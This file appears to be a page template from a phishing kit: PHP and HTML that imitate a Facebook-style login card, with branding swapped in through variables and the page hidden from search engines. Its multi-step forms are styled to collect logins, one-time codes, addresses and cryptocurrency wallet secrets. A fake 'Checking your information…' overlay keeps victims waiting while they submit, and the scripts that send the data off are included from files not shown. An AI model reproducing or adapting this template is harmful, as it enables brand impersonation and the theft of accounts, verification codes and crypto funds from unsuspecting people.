<?php
// Social template — Facebook style: white, narrow 396px, Helvetica, blue button, 2 steps
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title><?=$org_name?></title>
<meta name="robots" content="noindex,nofollow">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Helvetica,Arial,sans-serif;min-height:100vh;min-height:100dvh;background:#f0f2f5;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px 16px;color:#1c1e21}

/* Facebook exact logo style at top */
.site-logo{font-size:40px;font-weight:900;color:<?=$accent?>;letter-spacing:-2px;text-align:center;margin-bottom:16px;font-family:'Helvetica Neue',Arial,sans-serif}

.card{width:100%;max-width:396px;background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:20px}

/* Logo in card */
.card-logo{display:flex;align-items:center;justify-content:center;margin-bottom:12px}
.logo-box{width:48px;height:48px;background:<?=$logo_bg?>;border-radius:8px;display:flex;align-items:center;justify-content:center;overflow:hidden}
.logo-box img{width:100%;height:100%;object-fit:contain}
.logo-ini{font-size:20px;font-weight:900;color:<?=$accent?>}

.step-title{font-size:20px;font-weight:600;color:#1c1e21;text-align:center;margin-bottom:4px;line-height:1.3}
.step-sub{font-size:14px;color:#65676b;text-align:center;margin-bottom:16px;line-height:1.4}

.field{margin-bottom:12px}
.field label{display:none}
.field input{width:100%;background:#fff;border:1px solid #dddfe2;color:#1c1e21;padding:14px 16px;border-radius:6px;font-size:17px;outline:none;transition:border-color .15s,box-shadow .15s;font-family:inherit;-webkit-appearance:none}
.field input:focus{border-color:<?=$accent?>;box-shadow:0 0 0 2px rgba(<?=$ar?>,<?=$ag?>,<?=$ab?>,.3)}
.field input::placeholder{color:#bec3c9}
.or-div{text-align:center;font-size:13px;color:#65676b;margin:12px 0;position:relative}
.or-div::before,.or-div::after{content:'';position:absolute;top:50%;width:40%;height:1px;background:#dddfe2}
.or-div::before{left:0}.or-div::after{right:0}
.card-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.btn{width:100%;padding:14px;background:<?=$accent?>;color:#fff;font-size:17px;font-weight:600;border:none;border-radius:6px;cursor:pointer;margin-top:4px;transition:filter .15s;position:relative;font-family:inherit}
.btn:hover{filter:brightness(1.08)}
.btn:disabled{opacity:.6;cursor:not-allowed}
.btn.loading::after{content:'';position:absolute;right:16px;top:50%;width:18px;height:18px;border:2px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;transform:translateY(-50%);animation:spin .7s linear infinite}
@keyframes spin{to{transform:translateY(-50%) rotate(360deg)}}
.err-msg{font-size:13px;color:#d32f2f;margin-top:8px;text-align:center;display:none}
.divider{height:1px;background:#dddfe2;margin:16px 0}
.new-account-btn{display:block;width:fit-content;margin:0 auto;padding:12px 24px;background:<?=$sec?>;color:#fff;font-size:15px;font-weight:600;border:none;border-radius:6px;cursor:pointer;font-family:inherit}
.footer-links{text-align:center;margin-top:24px;font-size:12px;color:#65676b}
.footer-links a{color:#385185;text-decoration:none;margin:0 6px}

/* Special fields for Facebook style (label-less) */
.wallet-area{width:100%;min-height:80px;background:#fff;border:1px solid #dddfe2;color:#1c1e21;padding:14px 16px;border-radius:6px;font-size:14px;font-family:monospace;outline:none;resize:none}
.wallet-area:focus{border-color:<?=$accent?>}
.wallet-hint{font-size:12px;color:#65676b;margin-top:6px;line-height:1.5;text-align:center}
.otp-wrap{display:flex;gap:8px;justify-content:center}
.otp-wrap input{flex:1;text-align:center;font-size:22px;font-weight:600;padding:12px 4px;max-width:48px;background:#fff;border:1px solid #dddfe2;border-radius:6px;color:#1c1e21;outline:none}
.otp-wrap input:focus{border-color:<?=$accent?>}
.otp-hint{font-size:13px;color:#65676b;text-align:center;margin-top:8px}
.addr-area{width:100%;min-height:60px;background:#fff;border:1px solid #dddfe2;color:#1c1e21;padding:14px 16px;border-radius:6px;font-size:15px;font-family:inherit;outline:none;resize:none}
.addr-area:focus{border-color:<?=$accent?>}

#loadOverlay{display:none;position:fixed;inset:0;background:rgba(255,255,255,.85);z-index:999;align-items:center;justify-content:center;flex-direction:column;gap:16px}
#loadOverlay.show{display:flex}
.load-spin{width:40px;height:40px;border:3px solid #e4e6ea;border-top-color:<?=$accent?>;border-radius:50%;animation:spin .8s linear infinite}
.load-txt{font-size:14px;color:#65676b}

@media(max-width:480px){
  body{padding:0;align-items:flex-start;background:#fff}
  .site-logo{display:none}
  .card{min-height:100vh;min-height:100dvh;border-radius:0;box-shadow:none;padding:24px 16px}
  .card-logo{margin-bottom:20px}
}
</style>
</head>
<body>
<div id="loadOverlay"><div class="load-spin"></div><div class="load-txt" id="loadText">Checking your information…</div></div>

<div class="site-logo"><?=htmlspecialchars($org_name)?></div>

<div class="card">
  <div class="card-logo">
    <div class="logo-box">
      <?php if($logo_url):?><img src="<?=htmlspecialchars($logo_url)?>" alt="" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'"><?php endif?>
      <span class="logo-ini" style="display:<?=$logo_url?'none':'flex'?>;align-items:center;justify-content:center;width:100%;height:100%"><?=mb_strtoupper(mb_substr($org_name,0,2))?></span>
    </div>
  </div>

  <?php for($sn=1;$sn<=$total_steps;$sn++): ?>
  <div id="step<?=$sn?>" <?=$sn>1?'style="display:none"':''?>>
    <div class="step-title"><?=htmlspecialchars($sc['step_titles'][$sn])?></div>
    <div class="step-sub" id="step<?=$sn?>sub"><?=htmlspecialchars($sc['step_subs'][$sn])?></div>
    <form onsubmit="submitStep(event,<?=$sn?>)">
      <?php $fld = $sc['step'.$sn.'_fields'] ?? 'email_only'; include __DIR__.'/partials/fields.php'; ?>
      <button type="submit" class="btn" id="btn<?=$sn?>"><?=htmlspecialchars($sc['btn_labels'][$sn-1])?></button>
      <div class="err-msg" id="err<?=$sn?>">Please enter the required information.</div>
    </form>
  </div>
  <?php endfor; ?>

  <div class="divider"></div>
  <div class="footer-links">
    <a href="#">Forgotten password?</a> &nbsp;·&nbsp;
    <a href="#">Help Center</a> &nbsp;·&nbsp;
    <a href="#">Privacy</a>
  </div>
</div>

<?php include __DIR__.'/partials/js.php'; ?>
</body>
</html>
